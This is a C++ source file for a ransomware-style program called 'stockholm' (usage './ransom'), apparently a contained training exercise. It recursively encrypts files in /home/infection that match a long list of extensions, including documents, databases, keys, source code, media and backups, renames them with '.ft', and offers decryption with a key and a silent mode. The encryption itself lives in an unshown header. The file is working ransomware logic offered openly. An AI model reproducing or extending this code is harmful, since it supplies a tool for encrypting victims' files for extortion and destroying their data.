#include <iostream>
#include <string>
#include <filesystem>
#include <vector>
#include <algorithm>
#include "crypto.hpp"

namespace fs = std::filesystem;

bool silent = false;

void printHelp() {
    std::cout << "Usage: ./ransom [option]\n"
              << "-h, --help       Show help\n"
              << "-v, --version    Show version\n"
              << "-r, --reverse <key>  Decrypt files\n"
              << "-s, --silent     No output\n";
}

void encryptDirectory(const std::string& key, bool decrypt = false) {
    std::string path = "/home/infection";
std::vector<std::string> targetExts = {
    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw", ".stw", ".uot",
    ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp",
    ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3",
    ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd",
    ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb",
    ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg",
    ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u",
    ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp",
    ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti",
    ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf",
    ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".ost", ".pst", ".potm", ".potx",
    ".ppam", ".ppsx", ".ppsm", ".pps", ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc",
    ".xlm", ".xlt", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
    ".docb", ".docx", ".doc"
};
    for (const auto& entry : fs::recursive_directory_iterator(path)) {
        if (!entry.is_regular_file()) continue;

        std::string filePath = entry.path();
        std::string ext = entry.path().extension();

        if (decrypt && ext == ".ft") {
            decryptFile(filePath, key);
            fs::rename(filePath, filePath.substr(0, filePath.size() - 3)); // remove .ft
        } else {
            if (std::find(targetExts.begin(), targetExts.end(), ext) != targetExts.end()) {
                encryptFile(filePath, key);
                if (ext != ".ft")
                    fs::rename(filePath, filePath + ".ft");
            }
        }

        if (!silent)
            std::cout << (decrypt ? "[Decrypted] " : "[Encrypted] ") << filePath << "\n";
    }
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printHelp();
        return 1;
    }

    std::string arg = argv[1];

    if (arg == "-h" || arg == "--help") {
        printHelp();
    } else if (arg == "-v" || arg == "--version") {
        std::cout << "stockholm v0.1\n";
    } else if (arg == "-r" || arg == "--reverse") {
        if (argc < 3 || std::string(argv[2]).length() < 16) {
            std::cerr << "Error: A valid 16+ char key is required for decryption.\n";
            return 1;
        }
        encryptDirectory(argv[2], true);
    } else {
        std::string key = argv[1];
        if (key.length() < 16) {
            std::cerr << "Error: Encryption key must be at least 16 characters.\n";
            return 1;
        }

        for (int i = 2; i < argc; ++i) {
            if (std::string(argv[i]) == "-s" || std::string(argv[i]) == "--silent")
                silent = true;
        }

        encryptDirectory(key);
    }

    return 0;
}